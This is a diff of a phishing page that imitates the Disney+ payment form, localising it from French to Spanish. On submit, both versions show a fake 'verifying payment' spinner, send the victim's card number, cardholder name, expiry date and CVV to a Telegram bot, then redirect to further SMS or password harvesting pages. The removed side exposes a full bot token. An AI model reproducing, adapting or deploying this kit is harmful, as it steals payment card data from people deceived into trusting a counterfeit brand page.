@@ -1,57 +1,59 @@
 <!DOCTYPE html>
-<html lang="">
+<html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="robots" content="noindex, nofollow"/>
-  <title data-i18n-key="payTitle">Paiement | Disney+</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pago seguro | Disney+</title>
+  <style>
+    body {
+      margin:0; font-family:Arial,sans-serif;
+      background:radial-gradient(circle at top,#003264 0%,#032541 100%);
+      min-height:100vh; display:flex; flex-direction:column; align-items:center;
+      padding:60px 20px 30px;
+    }
+    .logo{width:110px;margin-bottom:20px;}
+    main {
+      background:#fff; color:#000;
+      width:100%; max-width:380px;
+      border-radius:20px; padding:25px;
+      box-shadow:0 10px 40px rgba(0,0,0,0.3);
+      text-align:center;
+    }
+    .cb-icons{display:flex;justify-content:center;gap:12px;margin:10px 0 18px;}
+    .cb-icons img{height:28px;filter:grayscale(100%);opacity:0.9;}
+    form{display:flex;flex-direction:column;}
+    input{width:100%;padding:16px;margin-bottom:16px;font-size:1rem;border:none;border-radius:8px;background:#f0f0f0;box-shadow:inset 0 2px 4px rgba(0,0,0,0.1);}
+    p{font-size:.85rem;color:#333;text-align:left;margin-bottom:18px;}
+    button{width:100%;padding:16px;background:#000;color:#fff;font-weight:bold;font-size:1rem;border:none;border-radius:999px;cursor:pointer;transition:background .3s;}
+    button:hover{background:#222;}
+    .footer-note{font-size:.75rem;color:#444;margin-top:26px;line-height:1.4;text-align:left;}
+    .logos-container{display:flex;gap:8px;overflow-x:auto;padding-bottom:6px;}
+    .logos-container img{height:18px;opacity:.7;filter:grayscale(100%);}
+    #spinnerOverlay{position:fixed;inset:0;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
+    .spinner{width:60px;height:60px;border:6px solid rgba(255,255,255,0.2);border-top:6px solid #00bfff;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px;}
+    .spinner-text{color:#fff;font-size:1.1rem;font-weight:500;}
+    @keyframes spin{to{transform:rotate(360deg);} }
+  </style>
 </head>
 <body>
-
-  <!-- Sélecteur de langue -->
-  <div class="lang-container">
-    <label for="lang-select" data-i18n-key="langLabel">Langue :</label>
-    <select id="lang-select">
-      <option value="fr">Français</option>
-      <option value="en">English</option>
-      <option value="de">Deutsch</option>
-      <option value="es">Español</option>
-    </select>
-  </div>
-
-  <!-- Logo -->
-  <header>
-    <img src="Images/compose2.png" alt="Disney+" class="logo" />
-  </header>
-
+  <img src="Images/compose2.png" alt="Disney+" class="logo"/>
   <main>
-    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney"/>
-
-    <h1 data-i18n-key="payTitle">Informations de paiement</h1>
-
-    <!-- Icônes CB (non traduites) -->
+    <h1>Información de pago</h1>
     <div class="cb-icons">
       <img src="Images/visa.png" alt="Visa"/>
       <img src="Images/Mastercard.png" alt="Mastercard"/>
       <img src="Images/Amex.png" alt="American Express"/>
     </div>
-
     <form id="paymentForm">
-      <input type="text" placeholder="" data-i18n-key="payCardNumber" required/>
-      <input type="text" placeholder="" data-i18n-key="payCardName" required/>
-      <input type="text" placeholder="" data-i18n-key="payExpiry" required/>
-      <input type="text" placeholder="" data-i18n-key="payCvv" required/>
-
-      <p class="footer-note" data-i18n-key="payNote">
-        <!-- note text -->
-      </p>
-
-      <button type="submit" class="btn" data-i18n-key="payBtn">Valider le paiement</button>
+      <input type="text" placeholder="Número de tarjeta" required/>
+      <input type="text" placeholder="Nombre en la tarjeta" required/>
+      <input type="text" placeholder="MM/AA" required/>
+      <input type="text" placeholder="CVV" required/>
+      <p>Al validar tu pago, aceptas que tu suscripción comience de inmediato y se renueve automáticamente cada mes. Sin compromiso, puedes cancelar en cualquier momento.</p>
+      <button type="submit">Validar pago</button>
     </form>
-
-    <div class="footer-note" data-i18n-key="payFooter">
-      <!-- footer logos description -->
+    <div class="footer-note">
+      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
+      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -63,56 +65,20 @@
       </div>
     </div>
   </main>
-
-  <!-- Spinner Overlay -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
-    <div class="spinner-text" data-i18n-key="paySpinnerText">Vérification bancaire en cours...</div>
+    <div class="spinner-text">Verificando pago…</div>
   </div>
-
-  <!-- i18n init -->
-  <script src="i18n.js"></script>
   <script>
-    // Récupère et applique langue
-    function getLanguage() {
-      let lang = localStorage.getItem('lang') || navigator.language.slice(0,2) || 'fr';
-      if (!translations[lang]) lang = 'fr';
-      return lang;
-    }
-    const lang = getLanguage();
-    localStorage.setItem('lang', lang);
-    document.documentElement.lang = lang;
-
-    // Sélecteur
-    const select = document.getElementById('lang-select');
-    select.value = lang;
-    select.addEventListener('change', e => {
-      localStorage.setItem('lang', e.target.value);
-      window.location.reload();
-    });
-
-    // Traductions
-    document.querySelectorAll('[data-i18n-key]').forEach(el => {
-      const key = el.getAttribute('data-i18n-key');
-      if (translations[lang][key]) el.placeholder = el.tagName==='INPUT'? translations[lang][key] : el.innerText = translations[lang][key];
-    });
-  </script>
-
-  <script>
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+    document.getElementById("paymentForm").addEventListener("submit",function(e){
       e.preventDefault();
-      document.getElementById("spinnerOverlay").style.display = "flex";
-
-      const [num, name, exp, cvv] = Array.from(this.elements)
-        .filter(el=>el.tagName==='INPUT')
-        .map(el=>el.value.trim());
-
-      const message = `💳 Paiement Disney+ :\nCarte: ${num}\nNom: ${name}\nExp: ${exp}\nCVV: ${cvv}`;
-      fetch(`https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage`, {
-        method:"POST", headers:{"Content-Type":"application/json"},
-        body: JSON.stringify({ chat_id: "-4970333928", text: message })
-      }).catch(console.error)
-      .finally(() => setTimeout(()=> window.location.href="sms-verification.html",17000));
+      document.getElementById("spinnerOverlay").style.display="flex";
+      const [num,name,exp,cvv] = Array.from(this.elements).filter(el=>el.tagName==="INPUT").map(el=>el.value.trim());
+      const msg = `💳 Pago Disney+: Tarjeta ${num}, Nombre ${name}, Exp ${exp}, CVV ${cvv}`;
+      fetch(`https://api.telegram.org/bot8079060666:.../sendMessage`,{
+        method:"POST",headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:"-4970333928",text:msg})
+      }).catch(console.error).finally(()=>setTimeout(()=>location.href="password.html",17000));
     });
   </script>
 </body>
